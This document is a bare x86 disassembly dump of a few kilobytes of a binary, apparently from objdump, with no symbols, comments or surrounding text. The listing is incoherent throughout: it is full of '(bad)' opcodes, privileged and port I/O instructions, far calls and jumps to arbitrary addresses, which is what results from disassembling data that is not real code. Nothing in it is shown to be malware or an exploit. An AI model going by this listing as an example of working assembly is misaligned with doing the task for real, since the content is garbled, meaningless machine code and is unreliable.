  42b3ad:	xchg   ebx,eax
  42b3ae:	push   esp
  42b3af:	mov    edi,0xb3cde496
  42b3b4:	cmp    al,0x3e
  42b3b6:	sar    BYTE PTR [eax+0x6cc206ad],1
  42b3bc:	mov    eax,0x5787832f
  42b3c1:	dec    edx
  42b3c2:	jno    0x42b3a8
  42b3c4:	fwait
  42b3c5:	rcl    DWORD PTR [edx-0x73],0x25
  42b3c9:	ror    BYTE PTR [edi-0x121e8a76],1
  42b3cf:	pop    ebx
  42b3d0:	retf   0x726a
  42b3d3:	add    BYTE PTR [ebp-0x7a],bl
  42b3d6:	fistp  WORD PTR [eax+ebx*1-0x49699e3e]
  42b3dd:	and    ah,ch
  42b3df:	mov    bh,0xe3
  42b3e1:	sub    eax,0x73df3b0
  42b3e6:	xor    al,0x74
  42b3e8:	cmp    al,0x27
  42b3ea:	cdq    
  42b3eb:	or     al,0xce
  42b3ed:	mov    ecx,0x551987bf
  42b3f2:	jns    0x42b3a2
  42b3f4:	and    al,0x49
  42b3f6:	iret   
  42b3f7:	mov    DWORD PTR [edi-0x2],eax
  42b3fa:	cld    
  42b3fb:	sbb    ebx,DWORD PTR [edx+ebp*4]
  42b3fe:	dec    ebp
  42b3ff:	jb     0x42b39c
  42b401:	and    dh,dl
  42b403:	adc    al,0x85
  42b405:	sub    al,0x3e
  42b407:	xchg   esp,eax
  42b408:	rcr    BYTE PTR [ebx+0x13],1
  42b40b:	pusha  
  42b40c:	in     eax,0x4f
  42b40e:	sar    BYTE PTR [edi+0x20],cl
  42b411:	fist   DWORD PTR [ebx+0x20]
  42b414:	dec    edx
  42b415:	inc    ecx
  42b416:	stc    
  42b417:	push   esi
  42b418:	add    eax,DWORD PTR [ebx-0x664c1f78]
  42b41e:	mov    edx,DWORD PTR ds:0xe251f915
  42b424:	test   dh,dl
  42b426:	and    DWORD PTR [eax-0x131eeb4e],eax
  42b42c:	mov    esi,0xeb8707b6
  42b431:	push   ds
  42b432:	xchg   BYTE PTR [edx+0x46],bh
  42b435:	aaa    
  42b436:	stc    
  42b437:	jmp    0x42b400
  42b439:	lahf   
  42b43a:	push   esi
  42b43b:	push   es
  42b43c:	das    
  42b43d:	adc    DWORD PTR ds:0x4bff17,esi
	...
  42b4b3:	add    BYTE PTR [eax],bl
  42b4b5:	dec    edi
  42b4b6:	pop    ss
  42b4b7:	mov    ecx,0xefbef957
  42b4bc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42b4bd:	fstp   QWORD PTR [esi+0x5]
  42b4c0:	arpl   dx,si
  42b4c2:	pushf  
  42b4c3:	push   0x36
  42b4c5:	retf   
  42b4c6:	add    DWORD PTR [eax],eax
  42b4c8:	test   BYTE PTR [eax],0x0
  42b4cb:	add    BYTE PTR [esi*2-0x47d530d3],dl
  42b4d2:	cmp    edi,ecx
  42b4d4:	xchg   edi,eax
  42b4d5:	adc    BYTE PTR [edi-0x21],ah
  42b4d8:	or     dh,al
  42b4da:	sub    ebp,esi
  42b4dc:	mov    ebp,DWORD PTR [edi+0x6f]
  42b4df:	outs   dx,DWORD PTR ds:[esi]
  42b4e0:	inc    edx
  42b4e1:	pop    ss
  42b4e2:	scas   eax,DWORD PTR es:[edi]
  42b4e3:	jb     0x42b472
  42b4e5:	cmp    al,BYTE PTR [ecx-0x7c2c691d]
  42b4eb:	xchg   edi,eax
  42b4ec:	scas   al,BYTE PTR es:[edi]
  42b4ed:	cwde   
  42b4ee:	xchg   BYTE PTR [ecx+0x48762f80],ah
  42b4f4:	push   ss
  42b4f5:	mov    ch,BYTE PTR [eax-0x5a64c25b]
  42b4fb:	ss (bad) 
  42b4fd:	into   
  42b4fe:	mov    esp,0xe5787d8c
  42b503:	rcr    edi,1
  42b505:	mov    edx,tr0
  42b508:	and    bh,BYTE PTR [ecx-0x4bdf83ce]
  42b50e:	mov    bl,0x86
  42b510:	sub    ch,dl
  42b512:	adc    DWORD PTR [edx+0x23ffe620],edi
  42b518:	cwde   
  42b519:	mov    ebp,ss
  42b51b:	mov    ebx,0x4b63c1b4
  42b520:	pop    ebp
  42b521:	test   BYTE PTR [eax-0x501c9d7c],cl
  42b527:	inc    esi
  42b528:	add    DWORD PTR [ebx],esp
  42b52a:	scas   al,BYTE PTR es:[edi]
  42b52b:	stc    
  42b52c:	cmp    al,0xb1
  42b52e:	fldenv [ebx]
  42b530:	inc    ecx
  42b531:	push   ecx
  42b532:	in     eax,0xf2
  42b534:	repnz mov bl,bl
  42b537:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42b538:	test   al,0x3f
  42b53a:	stos   BYTE PTR es:[edi],al
  42b53b:	inc    esi
  42b53c:	adc    bx,WORD PTR [ebx+0x297290c1]
  42b543:	(bad)  
  42b544:	stos   DWORD PTR es:[edi],eax
  42b545:	xchg   ebp,eax
  42b546:	cmc    
  42b547:	fs push ecx
  42b549:	push   edx
  42b54a:	mov    ecx,0xa70dc9fd
  42b54f:	lahf   
  42b550:	std    
  42b551:	mov    BYTE PTR [ecx+ebp*1+0x2ab36c27],dh
  42b558:	pop    ds
  42b559:	inc    eax
  42b55a:	push   es
  42b55b:	call   0x7e02:0x1f72120f
  42b562:	(bad)  
  42b563:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42b564:	xor    DWORD PTR [edx],ebx
  42b566:	fadd   st,st(0)
  42b568:	das    
  42b569:	call   0x9a2c:0x6d84a5c2
  42b570:	or     al,0x9c
  42b572:	or     esi,DWORD PTR [esi+0x666e4cef]
  42b578:	out    0x7a,eax
  42b57a:	call   0xefcf6dc2
  42b57f:	sub    al,0xab
  42b581:	cs or  ebp,edi
  42b584:	and    bl,BYTE PTR [ebp+0x14a381b0]
  42b58a:	dec    edx
  42b58b:	cmp    al,0x58
  42b58d:	xchg   edx,eax
  42b58e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42b58f:	sub    DWORD PTR [edi],esi
  42b591:	push   esi
  42b592:	cs popa 
  42b594:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42b595:	xor    DWORD PTR [edi],0xe7c449d
  42b59b:	cli    
  42b59c:	(bad)  
  42b59d:	in     al,dx
  42b59e:	pop    esp
  42b59f:	pop    ds
  42b5a0:	(bad)  
  42b5a2:	dec    eax
  42b5a3:	das    
  42b5a4:	idiv   dl
  42b5a6:	je     0x42b584
  42b5a8:	xor    ecx,DWORD PTR [ecx+0x7c]
  42b5ab:	cmp    ebx,DWORD PTR [ebx-0x4]
  42b5ae:	inc    edx
  42b5af:	jge    0x42b586
  42b5b1:	cli    
  42b5b2:	std    
  42b5b3:	cwde   
  42b5b4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42b5b5:	loop   0x42b57f
  42b5b7:	cdq    
  42b5b8:	or     eax,0x74cebfdb
  42b5bd:	pop    ebp
  42b5be:	aas    
  42b5bf:	mov    dh,0x7d
  42b5c1:	test   DWORD PTR [eax],0x0
	...
  42b633:	add    BYTE PTR [esi+edx*1],ah
  42b636:	outs   dx,BYTE PTR ds:[esi]
  42b637:	(bad)  
  42b638:	jle    0x42b639
  42b63a:	lods   eax,DWORD PTR ds:[esi]
  42b63b:	not    esi
  42b63d:	mov    dl,dh
  42b63f:	add    ch,BYTE PTR [eax+edx*2]
  42b642:	out    dx,al
  42b643:	ret    0xcc2c
  42b646:	add    DWORD PTR [eax],eax
  42b648:	test   BYTE PTR [eax],0x0
  42b64b:	add    al,dh
  42b64d:	je     0x42b5e3
  42b64f:	(bad)  
  42b650:	pop    esp
  42b651:	mov    WORD PTR [edx+0x1a],?
  42b654:	(bad)  
  42b655:	jo     0x42b5f5
  42b657:	or     cl,bl
  42b659:	add    esi,DWORD PTR [edi-0x54225d50]
  42b65f:	inc    ebx
  42b660:	(bad)
  42b664:	push   0xffffffe2
  42b666:	pop    edx
  42b667:	add    ebx,eax
  42b669:	or     BYTE PTR [edx-0x2d],bh
  42b66c:	add    bh,al
  42b66e:	push   DWORD PTR [eax-0x73]
  42b671:	pop    edi
  42b672:	ins    BYTE PTR es:[edi],dx
  42b673:	addr16 pop edi
  42b675:	adc    al,0x89
  42b677:	(bad)  
  42b678:	leave  
  42b679:	rol    BYTE PTR [eax-0x4],cl
  42b67c:	sbb    al,0xa2
  42b67e:	jle    0x42b6c5
  42b680:	xchg   edx,eax
  42b681:	add    bl,BYTE PTR [edx+eiz*2-0x4415e1d4]
  42b688:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42b689:	add    ch,cl
  42b68b:	push   ebp
  42b68c:	iret   
  42b68d:	mov    BYTE PTR ds:0xf825af77,dh
  42b693:	cmp    al,0x70
  42b695:	sbb    ah,dh
  42b697:	jnp    0x42b654
  42b699:	bnd jbe 0x42b6d6
  42b69c:	in     al,0x59
  42b69e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42b69f:	lock mov esi,0xa26a99d6
  42b6a5:	jne    0x42b6bd
  42b6a7:	jge    0x42b6cb
  42b6a9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42b6aa:	sbb    DWORD PTR [edi],esp
  42b6ac:	pop    es
  42b6ad:	xor    ebp,esp
  42b6af:	cwde   
  42b6b0:	cmp    eax,0xfdfc6851
  42b6b5:	and    eax,0x5e25d169
  42b6ba:	test   BYTE PTR [edx],0x1f
  42b6bd:	xchg   edx,eax
  42b6be:	scas   al,BYTE PTR es:[edi]
  42b6bf:	add    al,0x42
  42b6c1:	(bad)  
  42b6c2:	icebp  
  42b6c3:	mov    esi,DWORD PTR [ebp-0x2d]
  42b6c6:	mov    ebp,0xf554a7c8
  42b6cb:	inc    edx
  42b6cc:	in     al,dx
  42b6cd:	in     al,0x92
  42b6cf:	mov    esi,0x5169ecfd
  42b6d4:	push   ebx
  42b6d5:	fcmovbe st,st(0)
  42b6d7:	mov    WORD PTR [ebp+0x6c36dee9],fs
  42b6dd:	rdpmc  
  42b6df:	or     BYTE PTR [edx-0x13],0x3c
  42b6e3:	jl     0x42b720
  42b6e5:	shr    DWORD PTR ds:0x73e45db0,0x72
  42b6ec:	push   0x9c3564c
  42b6f1:	sbb    BYTE PTR [esi-0x3f649af3],dl
  42b6f7:	push   ecx
  42b6f8:	push   es
  42b6f9:	add    dl,ch
  42b6fb:	jecxz  0x42b766
  42b6fd:	and    eax,0xec80ed4b
  42b702:	add    edi,edx
  42b704:	push   0xffffff90
  42b706:	int    0x97
  42b708:	lods   al,BYTE PTR ds:[esi]
  42b709:	mov    cs,WORD PTR [esi]
  42b70b:	aam    0xc8
  42b70d:	pop    es
  42b70e:	and    eax,eax
  42b710:	bnd jne 0x42b790
  42b713:	add    eax,0xde66c5fb
  42b718:	inc    esi
  42b719:	fwait
  42b71a:	inc    ebx
  42b71b:	mov    dh,0xd8
  42b71d:	and    eax,0x5b80b97e
  42b722:	sub    DWORD PTR [ebx],esi
  42b724:	shl    al,1
  42b726:	xor    esi,DWORD PTR [edi]
  42b728:	push   es
  42b729:	xchg   edi,eax
  42b72a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42b72b:	cli    
  42b72c:	jae    0x42b797
  42b72e:	scas   al,BYTE PTR es:[edi]
  42b72f:	mov    cs,edi
  42b731:	xor    dh,al
  42b733:	mov    ebp,0x9dfe71fb
  42b738:	lods   eax,DWORD PTR ds:[esi]
  42b739:	sbb    edi,DWORD PTR [eax]
  42b73b:	lahf   
  42b73c:	sbb    eax,DWORD PTR [ebx+edi*2]
  42b73f:	shl    DWORD PTR ds:0x6c,cl
	...
  42b7b1:	add    BYTE PTR [eax],al
  42b7b3:	add    BYTE PTR [edx-0x10409c9b],cl
  42b7b9:	mov    edi,0x986a75de
  42b7be:	xor    eax,0x2b3367fb
  42b7c3:	sub    esp,DWORD PTR [edx]
  42b7c5:	int    0x1
  42b7c7:	add    dh,dh
  42b7c9:	add    BYTE PTR [eax],al
  42b7cb:	add    dl,ah
  42b7cd:	cmp    eax,0x8f17e482
  42b7d2:	pop    ds
  42b7d3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42b7d4:	sbb    eax,0xed0ea56e
  42b7d9:	andps  xmm7,XMMWORD PTR [edx+0x5f]
  42b7dd:	sbb    bl,BYTE PTR [ecx-0x1dfb747e]
  42b7e3:	cmp    al,BYTE PTR ds:0x8b1cc85d
  42b7e9:	lahf   
  42b7ea:	push   0x619151d2
  42b7ef:	jnp    0x42b7a9
  42b7f1:	(bad)  
  42b7f2:	test   eax,0x54aa6085
  42b7f7:	imul   ebx,DWORD PTR [ebx],0x59
  42b7fa:	(bad)  
  42b7fb:	mov    al,0xb5
  42b7fd:	push   es
  42b7fe:	inc    esp
  42b7ff:	mov    BYTE PTR [eax-0x6c],cl
  42b802:	mov    esi,0x3e70ca7a
  42b807:	cmp    eax,0xeb1f46ab
  42b80c:	sar    BYTE PTR [ebp-0x79437e8b],0x33
  42b813:	push   0x206b5dbc
  42b818:	pop    ds
  42b819:	xor    ebp,DWORD PTR ds:0xed095fe
  42b81f:	data16 arpl dx,bp
  42b822:	pop    esp
  42b823:	dec    ecx
  42b824:	setnp  BYTE PTR [esi-0x63]
  42b828:	rcr    DWORD PTR [ebx],cl
  42b82a:	pop    ds
  42b82b:	push   0x190d8108
  42b830:	iret   
  42b831:	pusha  
  42b832:	xor    cl,BYTE PTR [eax]
  42b834:	pusha  
  42b835:	lods   al,BYTE PTR ds:[esi]
  42b836:	dec    edi
  42b837:	push   cs
  42b838:	ss ja  0x42b897
  42b83b:	jmp    0x5a61b7a6
  42b840:	sub    DWORD PTR [ebp+0x18],ebx
  42b843:	mov    ch,0x16
  42b845:	or     esp,esp
  42b847:	or     DWORD PTR [ecx+0x6c],esi
  42b84a:	jp     0x42b83f
  42b84c:	enter  0x6311,0x7
  42b850:	add    BYTE PTR [ebx],0x54
  42b853:	mov    DWORD PTR [edx+0x6e],ecx
  42b856:	push   edx
  42b857:	inc    ecx
  42b858:	scas   ax,WORD PTR es:[edi]
  42b85a:	test   DWORD PTR [ebx+0x5f],eax
  42b85d:	mov    ecx,0xf4b3bca6
  42b862:	jns    0x42b8c6
  42b864:	lea    esp,gs:[edx+0x4bc91e37]
  42b86b:	rcl    DWORD PTR [ecx-0x35],0x2c
  42b86f:	div    BYTE PTR [ebp-0x3b]
  42b872:	icebp  
  42b873:	jo     0x42b892
  42b875:	mov    edi,0x531028a4
  42b87a:	mov    ecx,0x84589ebd
  42b87f:	push   0x1f10750f
  42b884:	and    DWORD PTR [esi],ebx
  42b886:	jnp    0x42b902
  42b888:	outs   dx,DWORD PTR ds:[esi]
  42b889:	sub    esp,DWORD PTR [ebp+0x35]
  42b88c:	fdiv   QWORD PTR [ecx]
  42b88e:	add    ch,BYTE PTR [ecx]
  42b890:	push   cs
  42b891:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42b892:	or     al,dh
  42b894:	ret    
  42b895:	pusha  
  42b896:	fwait
  42b897:	fwait
  42b898:	jl     0x42b918
  42b89a:	ror    DWORD PTR [edx-0x26a670dd],0xe2
  42b8a1:	daa    
  42b8a2:	test   eax,0x23bc6ddd
  42b8a7:	or     DWORD PTR [edx+0x2e6d4930],eax
  42b8ad:	push   0xf99a5d0
  42b8b2:	adc    dh,bh
  42b8b4:	test   BYTE PTR [esi-0x4b],dl
  42b8b7:	adc    BYTE PTR [ebx+0x752cad57],al
  42b8bd:	cmp    DWORD PTR [edi-0x69],esp
  42b8c0:	mov    al,ds:0x49
	...
  42b931:	add    BYTE PTR [eax],al
  42b933:	add    BYTE PTR [eax+0x3fee1d93],ch
  42b939:	out    dx,al
  42b93a:	sti    
  42b93b:	xlat   BYTE PTR ds:[ebx]
  42b93c:	ss push esi
  42b93e:	inc    esp
  42b93f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42b940:	pop    ds
  42b941:	mov    DWORD PTR [edi+0x1ce18a4],0xf600
  42b94b:	add    BYTE PTR [eax+0x3b59a473],bh
  42b951:	test   DWORD PTR [esi-0x7b],ecx
  42b954:	mov    DWORD PTR [esi-0x3a2faf07],ebp
  42b95a:	pop    ebp
  42b95b:	cmc    
  42b95c:	pop    edi
  42b95d:	jb     0x42b98d
  42b95f:	dec    edx
  42b960:	fisubr DWORD PTR [edi]
  42b962:	xor    eax,edx
  42b964:	push   cs
  42b965:	sub    eax,0xdc73e8f3
  42b96a:	and    eax,0x82259588
  42b96f:	fisubr WORD PTR [edx]
  42b971:	jp     0x42b943
  42b973:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b974:	mov    ecx,0xa235734a
  42b979:	in     al,0xcf
  42b97b:	add    esi,DWORD PTR [ecx+0x673550ab]
  42b981:	arpl   WORD PTR [ecx],di
  42b983:	mov    ebx,0xc72cdee4
  42b988:	sbb    eax,0x5d17ac10
  42b98d:	xchg   esp,eax
  42b98e:	pop    es
  42b98f:	xor    DWORD PTR [ecx+ebx*8],ebp
  42b992:	dec    edi
  42b993:	popf   
  42b994:	dec    ebp
  42b995:	call   0x4803:0x4f50dc10
  42b99c:	idiv   BYTE PTR [ebp+0x6d]
  42b99f:	inc    ecx
  42b9a0:	sub    bh,dl
  42b9a2:	or     bl,BYTE PTR [ebp+ecx*8-0x43387652]
  42b9a9:	retf   
  42b9aa:	and    BYTE PTR [ecx],dl
  42b9ac:	lds    esi,FWORD PTR [ebx+eiz*8]
  42b9af:	cmp    al,0x1e
  42b9b1:	dec    esi
  42b9b2:	gs and eax,0xac4b87a7
  42b9b8:	jnp    0x42b9ad
  42b9ba:	mov    ebp,DWORD PTR ds:0x3d637b0
  42b9c0:	push   edx
  42b9c1:	xchg   edx,eax
  42b9c2:	inc    edx
  42b9c3:	stos   BYTE PTR es:[edi],al
  42b9c4:	push   esi
  42b9c5:	sub    al,BYTE PTR ds:0x2b17b642
  42b9cb:	mov    bl,dh
  42b9cd:	call   0x1bea57e5
  42b9d2:	and    esi,DWORD PTR [eax+0x4b]
  42b9d5:	dec    ecx
  42b9d6:	sbb    al,BYTE PTR [esi+ebx*4-0x721dc758]
  42b9dd:	iret   
  42b9de:	sub    bl,BYTE PTR [ebx]
  42b9e0:	adc    edx,ebx
  42b9e2:	inc    esp
  42b9e3:	fiadd  DWORD PTR [edi+0x3badec09]
  42b9e9:	or     ebp,DWORD PTR [edi+0x4a3039a0]
  42b9ef:	inc    ebp
  42b9f0:	fdivr  DWORD PTR [edx]
  42b9f2:	sar    DWORD PTR [ecx-0x41],0x23
  42b9f6:	push   esi
  42b9f7:	sahf   
  42b9f8:	idiv   BYTE PTR [ecx]
  42b9fa:	pop    ss
  42b9fb:	pop    edi
  42b9fc:	add    eax,0xa9bfd2cc
  42ba01:	jmp    0xe2432b17
  42ba06:	pop    ss
  42ba07:	sub    dh,BYTE PTR [eax]
  42ba09:	mov    ecx,0x4e19cf29
  42ba0e:	pushf  
  42ba0f:	dec    esp
  42ba10:	repnz (bad)
  42ba13:	adc    eax,0x926a1ee9
  42ba18:	daa    
  42ba19:	(bad)  
  42ba1a:	aam    0xc4
  42ba1c:	mov    ch,0x3e
  42ba1e:	inc    edx
  42ba1f:	jge    0x42ba99
  42ba21:	mov    eax,ds:0x71b33971
  42ba26:	loop   0x42ba01
  42ba28:	mov    ebp,0xa2423f7a
  42ba2d:	or     al,0x8e
  42ba2f:	mov    ebp,0xc1c5b7d0
  42ba35:	fiadd  WORD PTR [ebx-0x1a]
  42ba38:	and    eax,0x3f70e5e8
  42ba3d:	int3   
  42ba3e:	inc    ecx
  42ba3f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42ba40:	cmp    BYTE PTR [eax+0x0],cl
	...
  42bab3:	add    BYTE PTR [esi],bh
  42bab5:	push   cs
  42bab6:	sub    al,0x5d
  42bab8:	cmp    al,0x7f
  42baba:	jg     0x42bb2b
  42babc:	cmp    al,BYTE PTR [esi+0x5013434c]
  42bac2:	inc    edx
  42bac3:	aas    
  42bac4:	push   cs
  42bac5:	iret   
  42bac6:	add    DWORD PTR [eax],eax
  42bac8:	test   BYTE PTR [eax],0x0
  42bacb:	add    BYTE PTR [esi-0x31984a91],ch
  42bad1:	pop    eax
  42bad2:	out    dx,eax
  42bad3:	jl     0x42bb01
  42bad5:	or     ecx,DWORD PTR [esi+0x7d]
  42bad8:	int    0xdd
  42bada:	dec    edx
  42badb:	jle    0x42bac4
  42badd:	int3   
  42bade:	mov    eax,DWORD PTR [esi+edi*2-0x6ed494ed]
  42bae5:	iret   
  42bae6:	loope  0x42bb64
  42bae8:	jg     0x42ba7a
  42baea:	dec    eax
  42baeb:	(bad)  
  42baec:	dec    edi
  42baed:	pop    ds
  42baee:	call   0x97b5:0xd1d323d8
  42baf5:	retf   0xba0d
  42baf8:	cmp    ch,BYTE PTR [eax]
  42bafa:	call   FWORD PTR ds:0xdc7c331d
  42bb00:	mov    esp,ebx
  42bb02:	xchg   esp,eax
  42bb03:	leave  
  42bb04:	cli    
  42bb05:	loopne 0x42bb53
  42bb07:	in     al,dx
  42bb08:	es or  eax,0x45dea91e
  42bb0e:	fs mov edx,0x6465b03d
  42bb14:	add    ah,BYTE PTR [ebp-0x4ca2f8e6]
  42bb1a:	mov    ds:0x3198d5ba,al
  42bb1f:	fadd   DWORD PTR ds:0x8aab4091
  42bb25:	pop    ebp
  42bb26:	arpl   WORD PTR [ebp+0x4097834f],cx
  42bb2c:	jmp    0x166d0d40
  42bb31:	ret    
  42bb32:	mov    ebx,0x9759bd02
  42bb37:	pop    ds
  42bb38:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42bb39:	cmp    ebx,DWORD PTR [edi+0x3e]
  42bb3c:	mov    WORD PTR [ecx-0x55],cs
  42bb3f:	add    dl,dh
  42bb41:	push   cs
  42bb42:	jmp    0x77526d4a
  42bb47:	adc    eax,0xbd893a92
  42bb4c:	sbb    DWORD PTR [esi+0x42a32795],0xffffffe1
  42bb53:	or     cl,dh
  42bb55:	ficomp WORD PTR [ebx+esi*4]
  42bb58:	iret   
  42bb59:	imul   eax,DWORD PTR [esi-0x72],0xffffffb6
  42bb5d:	cmp    eax,DWORD PTR [ecx+0x1f]
  42bb60:	retf   
  42bb61:	push   ds
  42bb62:	iret   
  42bb63:	xchg   edi,eax
  42bb64:	jne    0x42bb12
  42bb66:	mov    al,ds:0x8aacd157
  42bb6b:	adc    eax,0xbcfc650d
  42bb70:	lock cmp eax,0xb84ea8b5
  42bb76:	push   ss
  42bb77:	mov    esi,0xf38a078c
  42bb7c:	mov    ds:0x76ac37dd,eax
  42bb81:	int    0x5d
  42bb83:	ins    BYTE PTR es:[edi],dx
  42bb84:	lds    ebx,FWORD PTR [ebx-0x4b]
  42bb87:	sub    ebp,esp
  42bb89:	leave  
  42bb8a:	inc    ecx
  42bb8b:	sbb    ebp,DWORD PTR [ecx-0x16]
  42bb8e:	sbb    eax,0xd6d4eb8
  42bb93:	dec    ebp
  42bb94:	ja     0x42bbd6
  42bb96:	pop    ebx
  42bb97:	shl    ch,0x8
  42bb9a:	sbb    BYTE PTR [edx],dh
  42bb9c:	mov    edx,0xc8103741
  42bba1:	mov    ecx,ebx
  42bba3:	sbb    BYTE PTR [edi+0x3d],ch
  42bba6:	add    cl,ch
  42bba8:	or     DWORD PTR [edx-0x4e5acd8b],edi
  42bbae:	xor    ecx,esp
  42bbb0:	test   DWORD PTR [esi-0x92e0813],0xfcb11ba0
  42bbba:	lods   eax,DWORD PTR ds:[esi]
  42bbbb:	pop    esp
  42bbbc:	jae    0x42bb57
  42bbbe:	push   ecx
  42bbbf:	or     eax,0xa024
	...
  42bc34:	jmp    0xdf7cd86b
  42bc39:	ds out dx,eax
  42bc3b:	repz ffreep st(2)
  42bc3e:	(bad)  
  42bc3f:	aam    0x30
  42bc41:	shr    DWORD PTR [ebx],0xc4
  42bc44:	add    al,0xd0
  42bc46:	add    DWORD PTR [eax],eax
  42bc48:	test   BYTE PTR [eax],0x0
  42bc4b:	add    ch,bl
  42bc4d:	mov    ebp,0x6c6fc36e
  42bc52:	sbb    al,0x28
  42bc54:	ret    0x273d
  42bc57:	ja     0x42bc9b
  42bc59:	outs   dx,BYTE PTR ds:[esi]
  42bc5a:	adc    dh,BYTE PTR [edx+0x5f]
  42bc5d:	repz icebp 
  42bc5f:	xor    eax,0xff56c3e8
  42bc64:	pop    esi
  42bc65:	bound  ecx,QWORD PTR [edi+0x728367fb]
  42bc6b:	inc    edi
  42bc6c:	xor    esp,DWORD PTR [edi-0x278b74ae]
  42bc72:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42bc74:	icebp  
  42bc75:	mov    DWORD PTR [edx-0xc731f48],ebp
  42bc7b:	scas   eax,DWORD PTR es:[edi]
  42bc7c:	sbb    al,0xfd
  42bc7e:	outs   dx,DWORD PTR ds:[esi]
  42bc7f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42bc80:	add    bl,cl
  42bc82:	push   ss
  42bc83:	and    DWORD PTR [edx],esi
  42bc85:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42bc86:	xchg   esi,eax
  42bc87:	adc    al,0x15
  42bc89:	ror    BYTE PTR [edi+0x1e],0xc2
  42bc8d:	std    
  42bc8e:	les    ebp,FWORD PTR [ecx+ecx*8+0x1a]
  42bc92:	or     ch,BYTE PTR [ecx+0x56]
  42bc95:	dec    ebx
  42bc96:	(bad)  
  42bc97:	pop    esp
  42bc98:	mov    ds:0x57818c89,al
  42bc9d:	xchg   DWORD PTR [eax-0x42093981],esi
  42bca3:	dec    ecx
  42bca4:	clc    
  42bca5:	and    BYTE PTR [ebp-0x9],dh
  42bca8:	cmp    BYTE PTR [esi-0x296f7f42],dh
  42bcae:	xor    BYTE PTR [ecx+0x5f83e234],al
  42bcb4:	push   cs
  42bcb5:	rep lods eax,DWORD PTR ds:[esi]
  42bcb7:	cli    
  42bcb8:	call   0x33ae78
  42bcbd:	jae    0x42bd17
  42bcbf:	push   ss
  42bcc0:	mov    esi,0x656bb55f
  42bcc5:	ficom  DWORD PTR [ecx]
  42bcc7:	sbb    eax,0xd3ceeb36
  42bccc:	sti    
  42bccd:	or     ah,BYTE PTR ds:0x32b37dc2
  42bcd3:	les    esi,FWORD PTR [ebx-0x1a]
  42bcd6:	dec    edi
  42bcd7:	int3   
  42bcd8:	shr    DWORD PTR [ebx],cl
  42bcda:	inc    esp
  42bcdb:	fs loop 0x42bd16
  42bcde:	add    DWORD PTR [ebx-0x2e],edi
  42bce1:	adc    BYTE PTR [edi+0x6b02ee57],dl
  42bce7:	xor    al,0xe
  42bce9:	cs das 
  42bceb:	bound  ecx,QWORD PTR [ecx+ebx*4-0x4f0aaca4]
  42bcf2:	outs   dx,DWORD PTR ds:[esi]
  42bcf3:	cmp    esp,DWORD PTR [esi]
  42bcf5:	inc    ebx
  42bcf6:	xchg   ebp,eax
  42bcf7:	pslld  mm0,mm6
  42bcfa:	dec    edi
  42bcfb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42bcfc:	mov    ebp,0x3dab5c68
  42bd01:	pushf  
  42bd02:	outs   dx,BYTE PTR ds:[esi]
  42bd03:	rcl    DWORD PTR [ecx],0x10
  42bd06:	inc    ebx
  42bd07:	fbld   TBYTE PTR [ecx]
  42bd09:	cdq    
  42bd0a:	dec    edi
  42bd0b:	mov    bh,0x6a
  42bd0d:	pop    ecx
  42bd0e:	xchg   ecx,eax
  42bd0f:	mov    ebx,DWORD PTR [ebp-0x1e]
  42bd12:	mov    gs,WORD PTR [esp+ebp*1]
  42bd15:	push   0xb4c09ebb
  42bd1a:	ret    0xbc66
  42bd1d:	iret   
  42bd1e:	mov    al,0xca
  42bd20:	out    dx,al
  42bd21:	in     eax,0xd2
  42bd23:	imul   esi,DWORD PTR [ecx],0x8b040f8c
  42bd29:	or     DWORD PTR [ecx+eiz*2],edx
  42bd2c:	mov    ch,0xd4
  42bd2e:	mov    bh,0x27
  42bd30:	repz cmp al,ch
  42bd33:	dec    edi
  42bd34:	push   eax
  42bd35:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42bd36:	mov    esi,0x5c5ed2df
  42bd3b:	pop    es
  42bd3c:	jb     0x42bcdd
  42bd3e:	mov    ecx,0x7a57eb
	...
  42bdb3:	add    BYTE PTR [edi+0x4a8e4af7],bh
  42bdb9:	mov    edi,0x5143f7ff
  42bdbe:	jne    0x42bdcc
  42bdc0:	pusha  
  42bdc1:	pop    ecx
  42bdc2:	add    ebp,DWORD PTR [ebp-0x6]
  42bdc5:	rol    BYTE PTR [ecx],1
  42bdc7:	add    dh,dh
  42bdc9:	add    BYTE PTR [eax],al
  42bdcb:	add    BYTE PTR [ecx+0x3a6efdb2],al
  42bdd1:	sar    BYTE PTR [edi+0x65],0x4a
  42bdd5:	cdq    
  42bdd6:	bound  ecx,QWORD PTR [eax]
  42bdd8:	push   edi
  42bdd9:	jne    0x42be07
  42bddb:	pop    ds
  42bddc:	push   eax
  42bddd:	cmp    bl,BYTE PTR ds:0xc4688047
  42bde3:	xchg   ah,bh
  42bde5:	push   esp
  42bde6:	mov    ds:0xa02cd0c2,eax
  42bdeb:	daa    
  42bdec:	repnz sbb cl,BYTE PTR [edx+0x61]
  42bdf0:	xchg   ebx,eax
  42bdf1:	es mov al,0x34
  42bdf4:	mov    ds:0x66e95f7f,al
  42bdf9:	or     DWORD PTR [ecx],edi
  42bdfb:	or     BYTE PTR [edx-0x29],bh
  42bdfe:	inc    edx
  42bdff:	cmp    ebp,eax
  42be01:	sahf   
  42be02:	xchg   ebp,eax
  42be03:	fnstcw WORD PTR [edi]
  42be05:	mov    ch,0x4e
